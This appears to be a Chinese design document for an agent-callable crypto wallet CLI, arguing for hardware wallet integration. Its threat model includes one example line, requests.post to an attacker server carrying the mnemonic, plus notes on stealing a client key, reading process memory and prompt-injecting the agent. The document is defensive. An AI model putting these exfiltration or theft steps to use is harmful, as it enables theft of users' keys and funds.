# 为什么需要硬件钱包

> Why we need hardware wallet integration before this CLI is ready for any
> non-trivial mainnet usage.

## TL;DR

**软件防御有天花板，超过这个天花板就靠物理隔离**。硬件钱包让私钥永远不离开安全芯片，每笔签名要物理按按钮——把"远程入侵笔记本就能偷光资金"压成"必须骗过你眼睛和手指才行"。

对一个允许 agent 调起签名的钱包，这道物理 human-in-the-loop 闸门是 policy 和 audit log 之外的最终防线。

ROI 临界点：钱包余额超过 $1500 必备（Ledger Nano X ~$150，占比 < 10%）。

---

## 当前 alice (AnB) 链路的暴露面

我们已经做了这些软件层加固：

- 助记词以密文存在 alice（AnB 客户端）；AES master key **不在客户端**，由独立的 `bob` KMS 守护进程持有（Argon2id 包裹 at rest，`mlock` 驻留内存，idle TTL 后清零），客户端经 mutual TLS 调用 bob 做解密
- 取助记词走 Unix FIFO，明文不落 disk
- 私钥派生后立即丢弃，进程退出后内存释放
- TTY-only 写入 vault（agent 没办法自己 set/rm）
- policy + idempotency + audit 防 agent 越权 / 重试 / 篡改

**这些都是软件防御**。AnB 比旧的 agent-vault 抬高了一档——master key 不再能从登录后自动解锁的 Keychain 派生出来，所以**离线撬保险柜这条路被堵死了**。但一旦攻击者拿到你笔记本上**用户级别**的执行权（不是 root，是 user），下面三条路任意一条仍能拿到助记词：

### 攻击路径 1：冒充 alice 去问 bob 要

```
笔记本被入侵（malware / phishing / 浏览器漏洞）
  ├─ 攻击者拿到当前用户进程权限
  ├─ 读 alice 的 client.key（0600，但同 UID 可读）✓  ← AnB 的 "secret-zero"
  ├─ bob 正在 serve 且 unlocked？
  │    ├─ 是 → 用偷来的 client cert 冒充 alice，请 bob 解密 → 拿到助记词 ✓
  │    └─ 否（bob 关停 / 已被 idle TTL 清零）→ 拿不到，需要 operator 的 master password 才能重新解锁
  └─ 注：这台 bob 多租户共用（wallet / n9e / reminder）。当前是单一 * identity，偷一张 cert = 三个租户全拿；
     只有给 wallet 单独 enroll identity 并在 authz 限到 wallet- 前缀，偷到的 cert 才碰不到其它租户的密钥
```

和 agent-vault 的关键区别：旧链路里"读 Keychain 派生主密钥"对同 UID 进程是**无条件**成立的；AnB 把它变成"**bob 必须此刻活着且解锁**"这个有条件窗口。把 `bob serve --ttl` 设短、用完即停，能把这个窗口压到最小——但只要 agent 要随时签名、bob 就得随时在线，这个结构性窗口就消不掉。这正是 AnB roadmap 把 "alice client key 上 Secure Enclave / PKCS#11" 列为下一步的原因：让冒充 alice 这一步也需要物理 presence。

### 攻击路径 2：供应链投毒

```
某个 pip 依赖被投毒（npm event-stream 那种事故，Python 也发生过）
  ├─ 下次 wallet send 时 web3.py 里多一行 requests.post(my_server, mnemonic)
  ├─ 你 git diff 看不出（依赖锁是 tarball hash，但 PyPI 有人能伪造发布）
  └─ 助记词不进 LLM 上下文，但跑到攻击者服务器上去了
```

供应链攻击是软件防御**结构性**搞不定的：你的代码可以审，但依赖代码每次更新都有可能新增恶意行为。`uv.lock` 锁版本能延缓但不能根治。

### 攻击路径 3：进程内存

```
wallet 签名瞬间，私钥在 Python bytes 对象里
  ├─ 同 UID 进程能 ptrace / task_for_pid → 读进程内存
  ├─ wallet 崩了产生 core dump → 私钥落硬盘
  └─ Python str/bytes immutable，GC 不可控，没法保证立即清零
```

我们 ROADMAP 里写了 zeroize 是 best-effort——CPython 的 immutable string 基本不可能完美清理。这是语言层面的限制，不是我们没尽力。

**软件层面这些都防不了**。我们能做的只是把这些攻击窗口压小，不是消除。

---

## 硬件钱包消除的是什么

```
私钥永远不离开 Ledger / Trezor 的安全芯片
  ├─ 笔记本上所有进程都看不到私钥（包括 wallet 自己）
  ├─ wallet 只构造 unsigned tx，发给设备
  ├─ 设备屏幕显示 "send 0.5 ETH to 0xFb0b..."
  ├─ 你按物理按钮确认 → 设备返回签名
  └─ 笔记本拿到签名好的 raw tx 广播
```

关键不变量：**笔记本被完全控制（root + kernel rootkit + 所有依赖被替换），攻击者也偷不到私钥**。

最坏情况是攻击者偷偷把 unsigned tx 内容改了（比如把 `to` 从 `0xVitalik` 换成 `0xAttacker`），但**你按按钮前要在设备屏幕上肉眼读**——设备的屏幕和按钮不经过笔记本，是独立的 I/O 通道，rootkit 改不到设备上显示的内容。

这条独立 I/O 通道是硬件钱包的核心安全特性。即使 wallet CLI 整个被替换成攻击者代码，设备显示的依然是真实的 tx 内容。

---

## 对 agent-callable 场景特别重要

我们这个 wallet 是**给 agent 用的**。意味着：

- agent 被 prompt injection 骗去签恶意 tx 是真实威胁（讨论过）
- 我们用 policy + spending cap 防 "agent 主动作恶"
- 但 policy 是软的：`policy.json` 落硬盘上，攻击链可以"先偷改 policy 再让 agent 签"

硬件钱包加一道**物理人闭环**的硬约束：

```
agent: wallet send 0xevil 1 ETH --broadcast --request-id ...
wallet: [policy 通过、idempotency 通过]
wallet: 把 unsigned tx 发给 Ledger
Ledger 屏幕: "Send 1 ETH to 0xevil..."   ← 你看到了
你: ❌ 不按按钮
=> 攻击失败，资金安全
```

policy 防的是"软件层面错误授权"，硬件钱包防的是"软件全部失守的最后一道闸门"。**两层叠加**才是完整的纵深防御。

如果 agent 在循环里跑（比如 cron 调度的 yield 优化策略），硬件钱包让"全自动"变成"半自动"——agent 提议交易，人按按钮放行。这听起来削弱了自动化，但对资金安全是**必要的代价**。如果你真要全自动，那必须用更小的 hot wallet + 严格的 policy 限额，把每日最大损失锁定在可接受范围。

---

## 实际成本

| 设备 | 价格 | 备注 |
|---|---|---|
| Ledger Nano S Plus | ~$80 | 最便宜的入门款，存储有限但 Ethereum + ERC-20 足够 |
| Ledger Nano X | ~$150 | 蓝牙 + 大屏，主流选择 |
| Trezor Safe 5 | ~$170 | 开源固件支持者首选，全触屏 |
| GridPlus Lattice1 | ~$400 | 大屏 + Secure Enclave，专业向，DeFi 体验好 |
| Tangem 卡 | ~$50 | NFC 卡形态，简单但不可备份 seed |

**ROI 阈值**：钱包持仓超过 $1500 时硬件钱包成本占比 < 10%，被盗一次的损失就远超设备成本。低于这个数量级，软件方案勉强够用，高于这个数量级，硬件钱包是底线。

---

## 但硬件钱包**不是银弹**

仍然解决不了：

1. **签名内容钓鱼**——你按按钮时如果不仔细读屏幕，依然会签恶意 tx。比如 ERC-20 的 `approve(0xattacker, MaxUint256)` 在某些 Ledger 上显示成一串十六进制字节，普通用户看不出问题。这是为什么 `policy.deny_unlimited_approve: true` 在 Ledger 之外仍然必要——双重保险。

2. **设备本身的供应链**——别从 Amazon 第三方卖家买 Ledger，要从官网。打开盒子检查防伪封贴，初始化时设备应该让你**自己**生成 seed，而不是显示一个"预设的"seed。如果设备开机直接显示 24 个词，丢掉这个设备，已经被植入恶意 firmware。

3. **物理盗窃 + PIN**——设备被偷且 PIN 弱（4 位数字），攻击者能签 tx。Ledger 默认 4-8 位 PIN，建议用 8 位 + 25th word passphrase（隐藏账户机制）。

4. **dApp UI 钓鱼**——浏览器里看到一个看起来像 Uniswap 的界面，让你 approve 给攻击者合约。Ledger 显示的是合约地址 hex，肉眼看不出 Uniswap router 还是攻击者地址。所以 `contract_allowlist` 在 policy 里仍然有用——它在 Ledger 之前先把陌生合约拦掉。

5. **同形异义字 / typosquatting 地址**——`0xAa...` 和 `0xAA...` 看起来差不多。设备屏幕一行只能显示几十字符，地址中间一段被省略。建议养成习惯：检查地址前 6 位**和**后 4 位（不只看前面）。

---

## 集成方案概要

eth-account 和 web3.py 都已支持 Ledger。我们的 wallet 改造工作量大约 1-2 天：

1. **`core/signer.py` 加分支**：
   ```python
   if account.account_type == "hd_mnemonic":
       # 现有路径：vault → derive → sign
   elif account.account_type == "ledger":
       from ledgereth.transactions import create_transaction
       signed = create_transaction(
           tx, sender_path=account.derivation_path,
           dongle=get_dongle(),
       )
       return signed.raw_transaction
   ```

2. **`storage/state.py` 加 `account_type` 字段**：

   ```jsonc
   {
     "name": "main_cold",
     "account_type": "ledger",
     "address": "0x...",
     "derivation_path": "m/44'/60'/0'/0/0",
     "vault_key": null    // Ledger 账户没有 vault key
   }
   ```

3. **`cli/account.py` 加 `account add-ledger`**：交互式让用户从设备读出地址，登记进 state。这个流程必须 TTY，要用户在 Ledger 上确认 export address。

4. **依赖**：`pip install ledgereth` 或 `eth-account[hardware]`（视上游情况）。需要 USB 权限（macOS 上 hidapi 自动处理）。

5. **测试覆盖**：mock Ledger dongle 的单测；真机端到端验证用户手工跑（CI 跑不了）。

state.json 里 mnemonic 和 ledger 账户共存，policy / audit / idempotency 全部不变——账户类型对它们透明。

---

## 还没买硬件钱包前的中间加固：AnB 的 off-disk custody + 收紧 bob

> **变更说明**：旧版本这里推荐的是 `@kaka-milan-22/agent-vault@0.5.0+` 的 per-key
> `--require-presence`（每次解密弹 macOS Touch ID）。迁移到 AnB 后这条不再适用——
> **AnB v2 没有 per-key Touch ID 闸门**。它不是退步而是换了机制：master key 不再
> 由 Keychain 派生，"离线撬保险柜"那条路本身就没了；presence gate 留待 AnB roadmap
> 的 "alice client key 上 Secure Enclave / PKCS#11" 重新引入。

在没有硬件钱包、也没有 SEP-backed client key 之前，靠下面这几条把暴露窗口压到最小：

- **off-disk KEK**：master key 只在 bob 进程里（`mlock`，idle TTL 清零），客户端只有密文。攻击路径 1 从"无条件读 Keychain"降级成"bob 必须此刻活着且解锁"。
- **短 idle TTL**：`bob serve --ttl <秒>`，用完即清零。无人值守时间越短，可被冒充窗口越小。
- **专用 identity + authz 前缀授权**：这台 bob 是多消费者共用的（wallet / n9e / reminder 当前同一张 cert + `*`），所以给 wallet **单独 enroll 一个 alice identity**（独立 client cert / `ANB_ALICE_DIR`），再在 `authz.json` 把它限到 `wallet-` 前缀。这样 wallet 的 cert 被偷只能碰 `wallet-`，碰不到 n9e/reminder 的密钥；反过来那些暴露面更大的 bot 也碰不到助记词。共用 identity 给 `*` 拿不到这层隔离。
- **锁死 client.key**：保持 `~/.anb/alice/client.key` 0600；它是 AnB 的 secret-zero，丢了等于把冒充 alice 的能力交出去——丢了就轮换 CA / 重签。

### 还没解决的（为什么 Ledger 仍是终点）

off-disk custody 把攻击者的成本提高一档，但**没有抹掉**：

- **二进制替换攻击**：拿到笔记本写权限的攻击者可以把 PATH 上的 `alice` 换成 shim，它持有 client cert、能照常向 bob 要明文。Ledger 的 secure element 防御这条路（ROADMAP 里 "alice binary integrity" 项是对应的软件层缓解）。
- **冒充 + 在线 bob**：偷到 `client.key` 且 bob 此刻 unlocked，同 UID 进程就能请 bob 解密。这是 AnB 当前模型下最现实的一条，只有把 client key 挪进 Secure Enclave（需要物理 presence 才能用）才真正堵上。
- **进程内存 dump**：bob 解密后明文 mnemonic 在 wallet 进程内存里存在几十毫秒，同 UID 攻击者用 `vmmap` / `lldb` 卡住那一刻仍能拿到。Ledger 的私钥从不离开 SE。
- **bob 是高价值靶子**：bob 持有 KEK、且看得到所有流经它的明文。无人值守的 bob 必须按 SPOF 来加固和审计。

**所以阈值不变**：mainnet 资金超过 ~$1.5k 还是上 Ledger。这个中间方案的定位是**测试网 + agent 实验 + 主网小额日常**这一档，在不买设备的前提下，把"离线偷密钥"这条最大暴露面直接消除、把"在线冒充"压成一个可收紧的小窗口。

AnB 的信任边界与限制清单见 [`AnB` README "Trust boundary"](https://github.com/kaka-milan-22/AnB#trust-boundary-read-this)。

---

## 决策树

| 场景 | 用什么 |
|---|---|
| 测试网 / agent 实验 / 学习 | alice (AnB) 即可（测试网资金归零无所谓；bob 默认配置就行） |
| 主网每日操作 < $1k | alice (AnB) **+ 短 `bob serve --ttl` + 专用 identity 限 `wallet-` 前缀** + 严格 policy 上限 |
| 主网持仓 $1k-$10k | Ledger 单签 |
| 主网持仓 > $10k | Ledger + Safe multisig 共管 |
| 团队 / 公司账户 | Safe multisig + 至少 2 个 Ledger |
| 全自动收益策略 | 小额 hot 账户（policy 严限 **+ 收紧 bob**）+ 大额冷储 Ledger，定期 hot → cold |

**底线**：任何放过夜的资金都应该至少有 Ledger 这一层。临时的小额 hot wallet（< $100）可以用 alice (AnB) 顶；agent 驱动的策略账户（即便小额）**必须**把 bob 的 idle TTL 设短、给该账户单独 enroll identity 并 authz 限到 `wallet-` 前缀、client.key 锁死，因为它的暴露面比手动操作的 hot wallet 大一档。等 AnB 的 Secure-Enclave client key 落地后，这一档可以再加回物理 presence 闸门。

---

## 相关 ROADMAP 项

本文档对应的实施在 [`ROADMAP.md`](../ROADMAP.md) 的 **Code work — engineering blocker** 部分。完成此项后才解锁"主网持仓"使用场景。

完成它依赖：

- `eth-account` / `ledgereth` API 稳定（已稳定）
- 用户拿到 Ledger 设备并完成初始化（一次性）
- wallet 自身的 1-2 天集成工作

不依赖任何外部协议或服务。
